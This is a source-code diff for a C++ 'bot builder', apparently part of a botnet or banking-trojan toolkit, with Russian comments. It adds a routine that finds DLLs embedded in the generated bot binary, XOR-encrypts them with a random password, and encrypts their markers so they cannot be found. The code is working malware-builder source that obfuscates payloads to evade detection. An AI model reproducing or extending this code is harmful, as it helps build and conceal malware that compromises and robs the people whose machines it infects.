@@ -20,6 +20,7 @@
 #include "Rafa.h"
 #include "cc.h"
 #include "HistoryAnalizer.h"
+#include "DllLoader.h"
 
 //---------------------------------------------------------------------------
 
@@ -185,7 +186,7 @@ __fastcall TBotBuilder::TBotBuilder(TComponent* AOwner)
 
 	// Инициализируем классы для шифрования строк
     FStringsEncryptor = new TBotStringsEncryptor(this);
-	FStringsPassword  = new TStringsPasswordParam(this, false, false, BOTPARAM_STRINGS_PASSW, MAX_STRINGS_PASSW_SIZE + 1, "Пароль шифрования строк");
+	FStringsPassword  = new TStringsPasswordParam(this, false, false, BOTPARAM_SESSION_PASSW, MAX_SESSION_PASSW_SIZE + 1, "Пароль шифрования строк");
 	FStringsPassword->AsAnsiString = "----";
 
 	// Добавляем основные параметры
@@ -254,7 +255,7 @@ void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
     Message(Status_StartBuild);
 
 	// Создаём случайый пароль шифрования строк
-	PCHAR StrPass = Random::RandomString(MAX_STRINGS_PASSW_SIZE, 32, 255);
+	PCHAR StrPass = Random::RandomString(MAX_SESSION_PASSW_SIZE, 32, 255);
 	FStringsPassword->AsAnsiString = StrPass;
 
 	// Проверяем параметры
@@ -301,8 +302,14 @@ void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 		PCHAR Buf     = (PCHAR)Mem->Memory;
 		DWORD BufSize = Mem->Size;
 
+
+		// Шифруем данные DLL
+		EncryptDllData(Buf, BufSize, StrPass);
+
 		// Шифруем строки бота
 		FStringsEncryptor->Encrypt(Buf, BufSize, StrPass);
+
+
 		STR::Free(StrPass);
 
 		// Вшиваем параметры
@@ -653,7 +660,47 @@ TBotModule*__fastcall TBotBuilder::ModuleByName(const UnicodeString &Name)
 
 	return NULL;
 }
+//----------------------------------------------------------------------------
 
+void __fastcall TBotBuilder::EncryptDllData(PCHAR Buf, DWORD BufSize, PCHAR Passw)
+{
+	// Функция шифрует данные библиотек
+	while (true)
+	{
+		// Определяем позицию DLL в буфере
+		int Pos = STR::Pos(Buf, ENCRYPTED_DLL_MARKER, BufSize, true);
+		if (Pos < 0)
+			break;
+
+		// Запоминаем начало маркера
+        PCHAR MarkerPtr = Buf + Pos;
+
+		// Переходим к длл
+		Buf     += Pos + ENCRYPTED_DLL_MARKER_SIZE;
+		BufSize -= Pos + ENCRYPTED_DLL_MARKER_SIZE;
+
+		// Определяем размер данных
+		DWORD DllSize = *(PDWORD)Buf;
+
+		// Пропускаем данные о размере
+		Buf     += sizeof(DWORD);
+		BufSize -= sizeof(DWORD);
+
+		if (DllSize > BufSize)
+			throw Exception("Нарушение целостности встроенных DLL!\r\nОбратитесь к разработчикам!");
+
+		// Шифруем данные
+		XORCrypt::Crypt(Passw, (LPBYTE)Buf, DllSize);
+
+		// Прячем маркер
+		XORCrypt::Crypt(Passw, (LPBYTE)MarkerPtr, ENCRYPTED_DLL_MARKER_SIZE);
+
+		// Пропускаем длл
+		Buf     += DllSize;
+		BufSize -= DllSize;
+	}
+}
+//----------------------------------------------------------------------------
 
 
 //-----------------------------------------------------------------------------
